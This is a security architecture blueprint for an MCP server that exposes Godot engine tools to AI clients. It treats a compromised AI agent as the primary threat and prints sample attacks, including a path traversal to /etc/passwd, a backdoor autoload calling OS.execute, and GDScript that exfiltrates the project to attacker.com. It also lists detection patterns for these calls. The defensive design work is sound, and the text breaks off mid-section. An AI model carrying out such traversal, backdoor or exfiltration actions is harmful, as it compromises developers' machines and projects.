# Godot 4.6 MCP Server - Security Architecture

**Document Version**: 1.0.0  
**Date**: February 3, 2026  
**Status**: Security Blueprint  
**Classification**: Internal  
**Authors**: @security-architect

---

## Executive Summary

This document defines the security architecture for the Godot 4.6 MCP Server, a Node.js-based bridge exposing Godot Engine capabilities via the Model Context Protocol. The architecture prioritizes **defense in depth**, **least privilege**, and **secure by default** principles while maintaining developer-friendly ergonomics for localhost development (MVP) and optional hardening for Phase 2 deployments.

**Security Posture**:
- **MVP (Phase 1)**: Localhost-only, no authentication, path traversal protection
- **Phase 2**: Optional API key authentication, rate limiting, audit logging, TLS support
- **Threat Level**: Medium (local development tools, trusted AI clients)
- **Compliance**: OWASP Top 10, CWE/SANS Top 25, Node.js Security Best Practices

**Key Security Objectives**:
1. Prevent unauthorized file system access beyond project directory
2. Protect against malicious tool invocations from compromised AI clients
3. Enable audit logging for forensic analysis
4. Support optional hardening for remote/team deployments

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Security Controls (MVP - Phase 1)](#2-security-controls-mvp---phase-1)
3. [Security Controls (Phase 2)](#3-security-controls-phase-2)
4. [Authentication & Authorization Design](#4-authentication--authorization-design)
5. [Secure Coding Practices](#5-secure-coding-practices)
6. [Security Testing Strategy](#6-security-testing-strategy)
7. [Incident Response](#7-incident-response)
8. [Security Architecture Diagrams](#8-security-architecture-diagrams)
9. [Dependency Security](#9-dependency-security)
10. [Compliance & Standards](#10-compliance--standards)

---

## 1. Threat Model

### 1.1 Asset Inventory

#### Critical Assets
| Asset | Description | Confidentiality | Integrity | Availability |
|-------|-------------|-----------------|-----------|--------------|
| Godot Project Files | `.gd`, `.tscn`, `.tres`, resources | High | High | Medium |
| Project Configuration | `project.godot`, `.godot/` cache | Medium | High | Medium |
| MCP Server Access | Tool invocation capabilities | Low | High | High |
| File System | Host machine file system | High | Critical | High |
| Audit Logs | Security event records (Phase 2) | Medium | Critical | Medium |
| API Keys | Authentication credentials (Phase 2) | Critical | Critical | Low |

#### Asset Risk Classification
- **Critical**: API keys, file system root access
- **High**: Godot source files, project configuration
- **Medium**: Cache files, audit logs, server access
- **Low**: Public documentation, icon files

### 1.2 Threat Actors

#### Primary Threat Actors
| Actor | Motivation | Capability | Likelihood | Impact |
|-------|-----------|------------|------------|--------|
| **Malicious AI Agent** | Data exfiltration, sabotage | Medium (limited by MCP protocol) | Medium | High |
| **Compromised VS Code Extension** | Persistent access, data theft | High (full IDE access) | Low | Critical |
| **Insider Threat (Developer)** | Accidental misconfiguration | Low (trusted user) | High | Medium |
| **Supply Chain Attack** | npm package compromise | High (dependency access) | Low | Critical |
| **Network Attacker (Phase 2)** | MitM, credential theft | Medium (local network) | Low | High |

#### Threat Actor Profiles

**1. Malicious AI Agent (Primary Concern)**
- **Description**: Compromised Claude Desktop/VS Code MCP client sending malicious tool invocations
- **Attack Vectors**:
  - Path traversal attempts (`../../../etc/passwd`)
  - File deletion operations (`delete_scene("important.tscn")`)
  - Code injection via GDScript snippets
  - Resource exhaustion (infinite file reads)
- **Mitigations**: Input validation, path sanitization, operation allowlisting, rate limiting

**2. Compromised VS Code Extension**
- **Description**: Malicious extension with MCP client capabilities
- **Attack Vectors**:
  - Full file system access via MCP tools
  - Credential theft from config files
  - Persistent backdoor via autoload scripts
  - Lateral movement to other projects
- **Mitigations**: Localhost-only binding (MVP), API key auth (Phase 2), audit logging

**3. Supply Chain Attack**
- **Description**: Compromised npm dependency injecting malicious code
- **Attack Vectors**:
  - Backdoor in `@modelcontextprotocol/sdk`
  - Typosquatting attack on dependencies
  - Malicious postinstall scripts
- **Mitigations**: Dependency pinning, `npm audit`, SRI checks, lockfile validation

### 1.3 Attack Vectors

#### Path Traversal (CWE-22)
**Severity**: Critical  
**Attack Scenario**:
```typescript
// Malicious tool invocation
read_file({
  path: "../../../../../../etc/passwd"
})
```

**Exploitation Flow**:
1. AI client sends MCP tool request with `../` sequences
2. Node.js server resolves path relative to project root
3. Server reads sensitive system files outside project directory
4. Data exfiltrated via MCP response

**Mitigations**:
- Path normalization (`path.resolve()`, `path.normalize()`)
- Allowlist validation (must start with project root)
- Reject paths with `../`, `..\\`, symlinks
- Filesystem jail via `chroot` simulation

#### Arbitrary File Write/Delete (CWE-73)
**Severity**: Critical  
**Attack Scenario**:
```typescript
// Malicious deletion
delete_file({
  path: "res://important_scene.tscn"
})

// Arbitrary write
write_scene({
  path: "res://autoload/backdoor.gd",
  content: "OS.execute('malicious_command', [])"
})
```

**Exploitation Flow**:
1. AI suggests "cleaning up unused files"
2. Sends delete commands for critical game assets
3. Or injects malicious autoload scripts
4. Developer unknowingly approves operation
5. Project corrupted or compromised

**Mitigations**:
- Confirmation prompts for destructive operations
- Write operation allowlist (no `autoload/` or `addons/`)
- File extension validation (only `.gd`, `.tscn`, `.tres`)
- Backup/restore capability
- Dry-run mode for destructive operations

#### Code Injection via GDScript (CWE-94)
**Severity**: High  
**Attack Scenario**:
```typescript
// Malicious script generation
create_script({
  path: "res://player.gd",
  content: `
extends CharacterBody2D
func _ready():
    # Backdoor: exfiltrate project to attacker server
    var http = HTTPRequest.new()
    http.request("https://attacker.com/upload", [], true, HTTPClient.METHOD_POST, JSON.stringify(get_tree().root))
`
})
```

**Mitigations**:
- Static analysis of generated GDScript (detect `OS.execute`, `HTTPRequest`)
- Developer review requirement for all script creation
- Sandbox Godot process (no network access by default)
- Content Security Policy for generated code

#### Resource Exhaustion (CWE-400)
**Severity**: Medium  
**Attack Scenario**:
```typescript
// Infinite loop attack
for (let i = 0; i < 1000000; i++) {
  read_file({ path: "res://large_asset.png" })
}
```

**Mitigations**:
- Rate limiting (max 100 requests/minute per client)
- Request size limits (max 10MB per request)
- Timeout enforcement (10s per tool invocation)
- Circuit breaker pattern (halt after 10 errors)

#### Man-in-the-Middle (Phase 2 Remote Access)
**Severity**: High (Phase 2 only)  
**Attack Scenario**:
1. Developer exposes MCP server to LAN (`0.0.0.0:3000`)
2. Attacker on same network intercepts HTTP traffic
3. Steals API key from Authorization header
4. Gains persistent access to MCP server

**Mitigations**:
- TLS/HTTPS mandatory for non-localhost binding
- HSTS headers (Strict-Transport-Security)
- Certificate pinning for known clients
- Mutual TLS (mTLS) for team deployments

### 1.4 Risk Assessment Matrix

| Threat | Likelihood | Impact | Risk Level | Priority | Status |
|--------|------------|--------|------------|----------|--------|
| Path Traversal | High | Critical | **Critical** | P0 | MVP |
| Arbitrary File Deletion | Medium | Critical | **High** | P0 | MVP |
| Code Injection (GDScript) | Medium | High | **High** | P1 | MVP |
| Resource Exhaustion | Medium | Medium | **Medium** | P2 | Phase 2 |
| Supply Chain Attack | Low | Critical | **High** | P1 | MVP |
| MitM (Remote Access) | Low | High | **Medium** | P2 | Phase 2 |
| Compromised VS Code Ext | Low | Critical | **High** | P2 | Phase 2 |
| Credential Theft | Low | High | **Medium** | P2 | Phase 2 |

**Risk Scoring**: `Risk Level = Likelihood × Impact`
- **Critical**: Immediate mitigation required (P0)
- **High**: Mitigate before GA release (P0-P1)
- **Medium**: Mitigate in Phase 2 (P2)
- **Low**: Monitor and revisit (P3)

---

## 2. Security Controls (MVP - Phase 1)

### 2.1 Network Binding Restrictions

#### Localhost-Only Binding
**Control ID**: SEC-NET-001  
**Implementation**:
```typescript
// src/config/server.config.ts
export const SERVER_CONFIG = {
  host: '127.0.0.1',  // MUST NOT be '0.0.0.0' in MVP
  port: 3000,
  allowedOrigins: ['http://localhost:*'],
} as const;

// src/server.ts
const server = http.createServer(app);
server.listen(SERVER_CONFIG.port, SERVER_CONFIG.host, () => {
  console.log(`[SECURITY] Server bound to ${SERVER_CONFIG.host}:${SERVER_CONFIG.port} (localhost only)`);
});

// Runtime validation
if (SERVER_CONFIG.host === '0.0.0.0' && process.env.NODE_ENV === 'production') {
  throw new Error('SECURITY VIOLATION: 0.0.0.0 binding not allowed in production');
}
```

**Rationale**: Prevents external network access to MCP server, limiting attack surface to local machine.

**Verification**:
```bash
# Verify binding (should only show 127.0.0.1)
netstat -an | grep 3000
# Expected: tcp4  0  0  127.0.0.1.3000  *.*  LISTEN
```

#### Firewall Validation (Deployment Check)
```typescript
// src/security/network-check.ts
export async function validateNetworkSecurity(): Promise<void> {
  const bindings = await getNetworkBindings();
  
  for (const binding of bindings) {
    if (binding.host !== '127.0.0.1' && binding.host !== '::1') {
      throw new SecurityError(
        `Insecure network binding detected: ${binding.host}`,
        'SEC-NET-001'
      );
    }
  }
}
```

### 2.2 Input Validation & Sanitization

#### Zod Schema Validation
**Control ID**: SEC-VAL-001  
**Implementation**:
```typescript
// src/validation/schemas.ts
import { z } from 'zod';
import path from 'path';

// Project root detection
const PROJECT_ROOT = process.cwd();

// Path validation schema
export const SafePathSchema = z.string()
  .trim()
  .min(1, 'Path cannot be empty')
  .max(4096, 'Path exceeds maximum length')
  .refine(
    (p) => !p.includes('\0'),
    'Path contains null bytes'
  )
  .refine(
    (p) => !/\.\.[/\\]/.test(p) && !/[/\\]\.\./.test(p),
    'Path contains traversal sequences (..)'
  )
  .refine(
    (p) => {
      const normalized = path.normalize(p);
      const resolved = path.resolve(PROJECT_ROOT, normalized);
      return resolved.startsWith(PROJECT_ROOT);
    },
    'Path escapes project directory'
  )
  .transform((p) => {
    // Convert res:// to absolute path
    if (p.startsWith('res://')) {
      return path.join(PROJECT_ROOT, p.slice(6));
    }
    return path.resolve(PROJECT_ROOT, p);
  });

// Tool input schemas
export const ReadFileInputSchema = z.object({
  path: SafePathSchema,
  encoding: z.enum(['utf8', 'binary']).default('utf8'),
});

export const WriteFileInputSchema = z.object({
  path: SafePathSchema,
  content: z.string().max(10 * 1024 * 1024, 'Content exceeds 10MB limit'),
  createBackup: z.boolean().default(true),
});

export const DeleteFileInputSchema = z.object({
  path: SafePathSchema,
  confirmToken: z.string().uuid('Delete operation requires confirmation token'),
});
```

#### Path Sanitization Pipeline
**Control ID**: SEC-VAL-002  
```typescript
// src/security/path-sanitizer.ts
import path from 'path';
import fs from 'fs/promises';

export class PathSanitizer {
  constructor(private readonly projectRoot: string) {}

  /**
   * Sanitize and validate file path
   * @throws {SecurityError} if path is unsafe
   */
  async sanitize(unsafePath: string): Promise<string> {
    // 1. Remove null bytes
    if (unsafePath.includes('\0')) {
      throw new SecurityError('Path contains null bytes', 'SEC-VAL-002');
    }

    // 2. Normalize path separators
    const normalized = path.normalize(unsafePath);

    // 3. Resolve to absolute path
    const resolved = path.resolve(this.projectRoot, normalized);

    // 4. Verify path is within project root
    if (!resolved.startsWith(this.projectRoot)) {
      throw new SecurityError(
        `Path traversal detected: ${unsafePath} resolves outside project root`,
        'SEC-VAL-002'
      );
    }

    // 5. Check for symbolic links (prevent symlink attacks)
    try {
      const realPath = await fs.realpath(resolved);
      if (!realPath.startsWith(this.projectRoot)) {
        throw new SecurityError(
          `Symlink traversal detected: ${resolved} -> ${realPath}`,
          'SEC-VAL-002'
        );
      }
    } catch (error) {
      // File doesn't exist yet (e.g., write operation) - allow
      if ((error as NodeJS.ErrnoException).code !== 'ENOENT') {
        throw error;
      }
    }

    return resolved;
  }

  /**
   * Validate file extension against allowlist
   */
  validateExtension(filePath: string, allowedExtensions: string[]): void {
    const ext = path.extname(filePath).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      throw new SecurityError(
        `File extension ${ext} not allowed. Allowed: ${allowedExtensions.join(', ')}`,
        'SEC-VAL-002'
      );
    }
  }
}
```

### 2.3 File Operation Validation

#### Read Operations
**Control ID**: SEC-FILE-001  
```typescript
// src/tools/read-file.tool.ts
import { SecurityError } from '../errors';
import { PathSanitizer } from '../security/path-sanitizer';

const ALLOWED_READ_EXTENSIONS = [
  '.gd', '.tscn', '.tres', '.godot', '.import',
  '.md', '.txt', '.json', '.cfg', '.xml',
  '.png', '.jpg', '.svg', '.wav', '.ogg'
];

const MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB

export async function readFileTool(args: ReadFileInput): Promise<ReadFileOutput> {
  const sanitizer = new PathSanitizer(PROJECT_ROOT);
  
  // 1. Sanitize path
  const safePath = await sanitizer.sanitize(args.path);
  
  // 2. Validate extension
  sanitizer.validateExtension(safePath, ALLOWED_READ_EXTENSIONS);
  
  // 3. Check file exists and is readable
  const stat = await fs.stat(safePath);
  if (!stat.isFile()) {
    throw new SecurityError(`Path is not a file: ${args.path}`, 'SEC-FILE-001');
  }
  
  // 4. Check file size
  if (stat.size > MAX_FILE_SIZE) {
    throw new SecurityError(
      `File size ${stat.size} exceeds limit ${MAX_FILE_SIZE}`,
      'SEC-FILE-001'
    );
  }
  
  // 5. Read file with explicit encoding
  const content = await fs.readFile(safePath, args.encoding);
  
  // 6. Audit log
  auditLog({
    action: 'file_read',
    path: safePath,
    size: stat.size,
    timestamp: new Date(),
  });
  
  return { content, path: safePath, size: stat.size };
}
```

#### Write Operations
**Control ID**: SEC-FILE-002  
```typescript
// src/tools/write-file.tool.ts
const ALLOWED_WRITE_EXTENSIONS = ['.gd', '.tscn', '.tres', '.md', '.json', '.cfg'];
const BLOCKED_WRITE_PATHS = [
  'autoload/',      // Prevent autoload injection
  'addons/',        // Prevent plugin injection
  '.godot/',        // Prevent cache tampering
  '../',            // Redundant with path sanitization
];

export async function writeFileTool(args: WriteFileInput): Promise<WriteFileOutput> {
  const sanitizer = new PathSanitizer(PROJECT_ROOT);
  
  // 1. Sanitize path
  const safePath = await sanitizer.sanitize(args.path);
  
  // 2. Validate extension
  sanitizer.validateExtension(safePath, ALLOWED_WRITE_EXTENSIONS);
  
  // 3. Check blocked paths
  const relativePath = path.relative(PROJECT_ROOT, safePath);
  for (const blockedPath of BLOCKED_WRITE_PATHS) {
    if (relativePath.startsWith(blockedPath)) {
      throw new SecurityError(
        `Write operation blocked: ${blockedPath} is protected`,
        'SEC-FILE-002'
      );
    }
  }
  
  // 4. Create backup if file exists
  if (args.createBackup) {
    try {
      const backupPath = `${safePath}.backup.${Date.now()}`;
      await fs.copyFile(safePath, backupPath);
    } catch (error) {
      // File doesn't exist - no backup needed
      if ((error as NodeJS.ErrnoException).code !== 'ENOENT') {
        throw error;
      }
    }
  }
  
  // 5. Validate content (basic checks)
  if (args.content.includes('\0')) {
    throw new SecurityError('Content contains null bytes', 'SEC-FILE-002');
  }
  
  // 6. Write file atomically
  const tempPath = `${safePath}.tmp.${process.pid}`;
  await fs.writeFile(tempPath, args.content, 'utf8');
  await fs.rename(tempPath, safePath);
  
  // 7. Audit log
  auditLog({
    action: 'file_write',
    path: safePath,
    size: args.content.length,
    timestamp: new Date(),
  });
  
  return { path: safePath, size: args.content.length };
}
```

#### Delete Operations (High-Risk)
**Control ID**: SEC-FILE-003  
```typescript
// src/tools/delete-file.tool.ts
export async function deleteFileTool(args: DeleteFileInput): Promise<DeleteFileOutput> {
  // REQUIRES EXPLICIT CONFIRMATION TOKEN
  // Token must be generated by UI and confirmed by user
  
  const sanitizer = new PathSanitizer(PROJECT_ROOT);
  
  // 1. Validate confirmation token
  const expectedToken = await getDeleteConfirmationToken(args.path);
  if (args.confirmToken !== expectedToken) {
    throw new SecurityError(
      'Invalid delete confirmation token. User confirmation required.',
      'SEC-FILE-003'
    );
  }
  
  // 2. Sanitize path
  const safePath = await sanitizer.sanitize(args.path);
  
  // 3. Create backup before deletion
  const backupPath = `${safePath}.deleted.${Date.now()}`;
  await fs.copyFile(safePath, backupPath);
  
  // 4. Delete file
  await fs.unlink(safePath);
  
  // 5. Audit log (CRITICAL EVENT)
  auditLog({
    action: 'file_delete',
    path: safePath,
    backupPath: backupPath,
    confirmToken: args.confirmToken,
    timestamp: new Date(),
    severity: 'HIGH',
  });
  
  return { deleted: safePath, backup: backupPath };
}
```

### 2.4 Godot Process Sandboxing

#### Process Isolation
**Control ID**: SEC-PROC-001  
```typescript
// src/godot/godot-bridge.ts
import { spawn } from 'child_process';

export class GodotBridge {
  private godotProcess: ChildProcess | null = null;

  async startGodot(projectPath: string): Promise<void> {
    const sanitizer = new PathSanitizer(projectPath);
    const safeProjectPath = await sanitizer.sanitize('project.godot');

    this.godotProcess = spawn('godot', [
      '--headless',                    // No GUI
      '--no-window',                   // No window
      '--path', path.dirname(safeProjectPath),
      '--script', 'res://mcp_bridge.gd',
      '--',
      '--port', '7777',                // Internal RPC port
      '--host', '127.0.0.1',           // Localhost only
    ], {
      cwd: projectPath,
      env: {
        ...process.env,
        // Restrict Godot capabilities
        GODOT_DISABLE_NETWORK: '1',    // No network access by default
        GODOT_DISABLE_AUDIO: '1',      // No audio device access
      },
      stdio: ['ignore', 'pipe', 'pipe'],
      detached: false,                 // Kill with parent
    });

    // Monitor for suspicious activity
    this.godotProcess.stderr?.on('data', (data) => {
      const output = data.toString();
      if (this.detectSuspiciousActivity(output)) {
        auditLog({
          action: 'suspicious_godot_activity',
          output: output,
          severity: 'HIGH',
          timestamp: new Date(),
        });
      }
    });
  }

  private detectSuspiciousActivity(output: string): boolean {
    const suspiciousPatterns = [
      /OS\.execute/i,
      /HTTPRequest/i,
      /TCP_Server/i,
      /UDP_Server/i,
      /OS\.shell_open/i,
    ];
    return suspiciousPatterns.some(pattern => pattern.test(output));
  }
}
```

### 2.5 Error Handling & Information Disclosure Prevention

#### Safe Error Responses
**Control ID**: SEC-ERR-001  
```typescript
// src/errors/error-handler.ts
export class ErrorHandler {
  /**
   * Sanitize error for client response
   * Prevents information disclosure (file paths, stack traces)
   */
  static sanitizeError(error: Error): MCPErrorResponse {
    // Development mode: Full error details
    if (process.env.NODE_ENV === 'development') {
      return {
        code: 'INTERNAL_ERROR',
        message: error.message,
        details: {
          stack: error.stack,
          name: error.name,
        },
      };
    }

    // Production mode: Generic error messages
    if (error instanceof SecurityError) {
      return {
        code: error.code,
        message: 'Security policy violation',
        // DO NOT expose details (path, user, system info)
      };
    }

    if (error instanceof ValidationError) {
      return {
        code: 'INVALID_INPUT',
        message: 'Input validation failed',
        details: {
          field: error.field,
          constraint: error.constraint,
        },
      };
    }

    // Generic error (hide internal details)
    return {
      code: 'INTERNAL_ERROR',
      message: 'An unexpected error occurred',
      // DO NOT expose stack traces, file paths, or system info
    };
  }
}

// Usage in tool handlers
try {
  return await readFileTool(args);
} catch (error) {
  auditLog({
    action: 'tool_error',
    tool: 'read_file',
    error: error.message,
    timestamp: new Date(),
  });
  return ErrorHandler.sanitizeError(error);
}
```

---

## 3. Security Controls (Phase 2)

### 3.1 API Key Authentication

#### API Key Format & Storage
**Control ID**: SEC-AUTH-001  
```typescript
// API Key Format: godot-mcp-<version>-<random>-<checksum>
// Example: godot-mcp-v1-a7f3c9e2d8b1-4f8e

import crypto from 'crypto';

export class APIKeyManager {
  /**
   * Generate cryptographically secure API key
   */
  generateAPIKey(): string {
    const version = 'v1';
    const random = crypto.randomBytes(16).toString('hex');
    const checksum = crypto
      .createHash('sha256')
      .update(random)
      .digest('hex')
      .slice(0, 4);
    
    return `godot-mcp-${version}-${random}-${checksum}`;
  }

  /**
   * Validate API key format and checksum
   */
  validateKeyFormat(key: string): boolean {
    const pattern = /^godot-mcp-(v\d+)-([a-f0-9]{32})-([a-f0-9]{4})$/;
    const match = key.match(pattern);
    
    if (!match) return false;
    
    const [, version, random, checksum] = match;
    const expectedChecksum = crypto
      .createHash('sha256')
      .update(random)
      .digest('hex')
      .slice(0, 4);
    
    return checksum === expectedChecksum;
  }

  /**
   * Hash API key for storage (never store plaintext)
   */
  hashKey(key: string): string {
    return crypto
      .pbkdf2Sync(key, process.env.API_KEY_SALT!, 100000, 64, 'sha512')
      .toString('hex');
  }
}
```

#### API Key Storage
**Control ID**: SEC-AUTH-002  
```typescript
// Storage: ~/.godot-mcp/keys.json (encrypted at rest)
interface APIKeyRecord {
  id: string;              // UUID
  keyHash: string;         // Hashed key (never plaintext)
  name: string;            // Human-readable name
  permissions: string[];   // Tool allowlist
  createdAt: Date;
  expiresAt: Date | null;
  revokedAt: Date | null;
  lastUsedAt: Date | null;
  usageCount: number;
}

// Encryption at rest
import { encrypt, decrypt } from './crypto';

export class APIKeyStore {
  private readonly storePath = path.join(os.homedir(), '.godot-mcp', 'keys.json');

  async saveKey(record: APIKeyRecord): Promise<void> {
    const keys = await this.loadKeys();
    keys.push(record);
    
    const encrypted = encrypt(JSON.stringify(keys), this.getMasterKey());
    await fs.writeFile(this.storePath, encrypted, { mode: 0o600 }); // Owner read/write only
  }

  private getMasterKey(): Buffer {
    // Derive master key from system keychain or environment
    const keySource = process.env.GODOT_MCP_MASTER_KEY || os.userInfo().username;
    return crypto.pbkdf2Sync(keySource, 'godot-mcp-salt', 100000, 32, 'sha512');
  }
}
```

#### Authentication Middleware
**Control ID**: SEC-AUTH-003  
```typescript
// src/middleware/auth.middleware.ts
export function authenticateAPIKey(req: Request, res: Response, next: NextFunction): void {
  // Skip auth if disabled (MVP mode)
  if (!process.env.REQUIRE_API_KEY) {
    return next();
  }

  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({
      error: 'Missing or invalid Authorization header',
      code: 'UNAUTHORIZED',
    });
  }

  const apiKey = authHeader.slice(7); // Remove 'Bearer '
  
  // Validate format (fast check before DB lookup)
  if (!keyManager.validateKeyFormat(apiKey)) {
    return res.status(401).json({
      error: 'Invalid API key format',
      code: 'INVALID_API_KEY',
    });
  }

  // Verify key against database
  const keyHash = keyManager.hashKey(apiKey);
  const keyRecord = await keyStore.findByHash(keyHash);
  
  if (!keyRecord || keyRecord.revokedAt) {
    auditLog({
      action: 'auth_failed',
      reason: keyRecord?.revokedAt ? 'revoked' : 'not_found',
      keyId: keyRecord?.id,
      ip: req.ip,
      timestamp: new Date(),
    });
    return res.status(401).json({
      error: 'Invalid or revoked API key',
      code: 'UNAUTHORIZED',
    });
  }

  // Check expiration
  if (keyRecord.expiresAt && keyRecord.expiresAt < new Date()) {
    return res.status(401).json({
      error: 'API key expired',
      code: 'KEY_EXPIRED',
    });
  }

  // Update last used timestamp
  await keyStore.updateLastUsed(keyRecord.id);

  // Attach key record to request
  req.apiKey = keyRecord;
  next();
}
```

### 3.2 Rate Limiting

#### Per-Client Rate Limiting
**Control ID**: SEC-RATE-001  
```typescript
// src/middleware/rate-limiter.ts
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

// Global rate limiter (all endpoints)
export const globalRateLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute per IP
  message: 'Too many requests, please try again later',
  standardHeaders: true, // Return rate limit info in headers
  legacyHeaders: false,
  store: new RedisStore({
    client: new Redis(process.env.REDIS_URL),
    prefix: 'rl:global:',
  }),
  keyGenerator: (req) => {
    // Use API key if authenticated, otherwise IP
    return req.apiKey?.id || req.ip;
  },
});

// Per-tool rate limiting (stricter for write operations)
export const toolRateLimiter = {
  read: rateLimit({
    windowMs: 60 * 1000,
    max: 60, // 60 reads per minute
    skipSuccessfulRequests: false,
  }),
  
  write: rateLimit({
    windowMs: 60 * 1000,
    max: 20, // 20 writes per minute
    skipSuccessfulRequests: false,
  }),
  
  delete: rateLimit({
    windowMs: 60 * 1000,
    max: 5, // 5 deletions per minute (high-risk operation)
    skipSuccessfulRequests: false,
  }),
};

// Usage
app.use('/tools/read_*', toolRateLimiter.read);
app.use('/tools/write_*', toolRateLimiter.write);
app.use('/tools/delete_*', toolRateLimiter.delete);
```

#### Adaptive Rate Limiting
**Control ID**: SEC-RATE-002  
```typescript
// Detect and throttle suspicious activity patterns
export class AdaptiveRateLimiter {
  private readonly errorRates = new Map<string, number[]>();
  private readonly THRESHOLD = 0.5; // 50% error rate triggers throttling

  async checkRequest(clientId: string, req: Request): Promise<void> {
    const errorRate = this.calculateErrorRate(clientId);
    
    // Adaptive throttling based on error rate
    if (errorRate > this.THRESHOLD) {
      const delay = Math.min(errorRate * 1000, 10000); // Max 10s delay
      await sleep(delay);
      
      auditLog({
        action: 'adaptive_throttle',
        clientId: clientId,
        errorRate: errorRate,
        delay: delay,
        timestamp: new Date(),
      });
    }
  }

  recordError(clientId: string): void {
    const errors = this.errorRates.get(clientId) || [];
    errors.push(Date.now());
    
    // Keep only errors from last 5 minutes
    const cutoff = Date.now() - 5 * 60 * 1000;
    this.errorRates.set(
      clientId,
      errors.filter(t => t > cutoff)
    );
  }

  private calculateErrorRate(clientId: string): number {
    const errors = this.errorRates.get(clientId) || [];
    const totalRequests = this.getTotalRequests(clientId);
    return totalRequests > 0 ? errors.length / totalRequests : 0;
  }
}
```

### 3.3 Audit Logging

#### Comprehensive Audit Trail
**Control ID**: SEC-AUDIT-001  
```typescript
// src/logging/audit-logger.ts
import winston from 'winston';
import DailyRotateFile from 'winston-daily-rotate-file';

interface AuditEvent {
  timestamp: Date;
  action: string;
  actorId?: string;       // API key ID or 'anonymous'
  actorIP?: string;
  resourceType?: string;  // 'file', 'scene', 'project'
  resourcePath?: string;
  outcome: 'success' | 'failure';
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  details?: Record<string, unknown>;
}

export const auditLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    // Daily rotating file (keep 90 days)
    new DailyRotateFile({
      filename: 'audit-%DATE%.log',
      dirname: path.join(os.homedir(), '.godot-mcp', 'logs'),
      datePattern: 'YYYY-MM-DD',
      maxFiles: '90d',
      maxSize: '100m',
    }),
    
    // Separate file for high-severity events
    new DailyRotateFile({
      filename: 'audit-critical-%DATE%.log',
      dirname: path.join(os.homedir(), '.godot-mcp', 'logs'),
      datePattern: 'YYYY-MM-DD',
      level: 'warn',
      maxFiles: '365d',
    }),
  ],
});

export function auditLog(event: Partial<AuditEvent>): void {
  const fullEvent: AuditEvent = {
    timestamp: new Date(),
    action: event.action || 'unknown',
    outcome: event.outcome || 'success',
    severity: event.severity || 'LOW',
    ...event,
  };

  // Never log sensitive data
  if (fullEvent.details) {
    delete fullEvent.details.apiKey;
    delete fullEvent.details.password;
    delete fullEvent.details.token;
  }

  auditLogger.info(fullEvent);

  // Alert on critical events
  if (fullEvent.severity === 'CRITICAL') {
    alertSecurityTeam(fullEvent);
  }
}

// Auditable actions
export const AUDIT_ACTIONS = {
  // Authentication
  AUTH_SUCCESS: 'auth_success',
  AUTH_FAILED: 'auth_failed',
  API_KEY_CREATED: 'api_key_created',
  API_KEY_REVOKED: 'api_key_revoked',
  
  // File operations
  FILE_READ: 'file_read',
  FILE_WRITE: 'file_write',
  FILE_DELETE: 'file_delete',
  
  // Security events
  PATH_TRAVERSAL_ATTEMPT: 'path_traversal_attempt',
  RATE_LIMIT_EXCEEDED: 'rate_limit_exceeded',
  SUSPICIOUS_ACTIVITY: 'suspicious_activity',
  
  // System events
  SERVER_START: 'server_start',
  SERVER_STOP: 'server_stop',
  CONFIG_CHANGED: 'config_changed',
} as const;
```

#### Audit Log Analysis
**Control ID**: SEC-AUDIT-002  
```typescript
// src/security/audit-analyzer.ts
export class AuditAnalyzer {
  /**
   * Detect anomalous patterns in audit logs
   */
  async detectAnomalies(): Promise<SecurityAlert[]> {
    const recentLogs = await this.getRecentLogs(24 * 60 * 60 * 1000); // 24 hours
    const alerts: SecurityAlert[] = [];

    // Pattern 1: High error rate
    const errorRate = this.calculateErrorRate(recentLogs);
    if (errorRate > 0.3) {
      alerts.push({
        type: 'HIGH_ERROR_RATE',
        severity: 'MEDIUM',
        message: `Error rate ${(errorRate * 100).toFixed(1)}% exceeds threshold`,
        recommendation: 'Investigate client behavior and error causes',
      });
    }

    // Pattern 2: Multiple path traversal attempts
    const traversalAttempts = recentLogs.filter(
      log => log.action === AUDIT_ACTIONS.PATH_TRAVERSAL_ATTEMPT
    );
    if (traversalAttempts.length > 5) {
      alerts.push({
        type: 'MULTIPLE_TRAVERSAL_ATTEMPTS',
        severity: 'HIGH',
        message: `${traversalAttempts.length} path traversal attempts detected`,
        recommendation: 'Revoke API key and investigate client',
      });
    }

    // Pattern 3: Unusual access patterns
    const accessPattern = this.analyzeAccessPattern(recentLogs);
    if (accessPattern.suspiciousScore > 0.7) {
      alerts.push({
        type: 'SUSPICIOUS_ACCESS_PATTERN',
        severity: 'MEDIUM',
        message: 'Unusual file access pattern detected',
        recommendation: 'Review accessed files and client intent',
      });
    }

    return alerts;
  }
}
```

### 3.4 TLS/HTTPS for Remote Access

#### TLS Configuration
**Control ID**: SEC-TLS-001  
```typescript
// src/config/tls.config.ts
import https from 'https';
import fs from 'fs';

export function createSecureServer(app: Express): https.Server {
  // Require TLS if not localhost
  if (SERVER_CONFIG.host !== '127.0.0.1' && !process.env.TLS_CERT_PATH) {
    throw new Error('TLS certificate required for non-localhost binding');
  }

  const tlsOptions: https.ServerOptions = {
    key: fs.readFileSync(process.env.TLS_KEY_PATH!),
    cert: fs.readFileSync(process.env.TLS_CERT_PATH!),
    ca: process.env.TLS_CA_PATH ? fs.readFileSync(process.env.TLS_CA_PATH) : undefined,
    
    // Strong TLS configuration
    minVersion: 'TLSv1.3',
    ciphers: [
      'TLS_AES_256_GCM_SHA384',
      'TLS_CHACHA20_POLY1305_SHA256',
      'TLS_AES_128_GCM_SHA256',
    ].join(':'),
    
    // Request client certificate (mTLS for team deployments)
    requestCert: process.env.REQUIRE_CLIENT_CERT === 'true',
    rejectUnauthorized: process.env.REQUIRE_CLIENT_CERT === 'true',
  };

  return https.createServer(tlsOptions, app);
}

// Middleware: HSTS header
export function hstsMiddleware(req: Request, res: Response, next: NextFunction): void {
  if (req.secure) {
    res.setHeader(
      'Strict-Transport-Security',
      'max-age=31536000; includeSubDomains; preload'
    );
  }
  next();
}
```

---

## 4. Authentication & Authorization Design

### 4.1 Authorization Model

#### Permission-Based Access Control
**Control ID**: SEC-AUTHZ-001  
```typescript
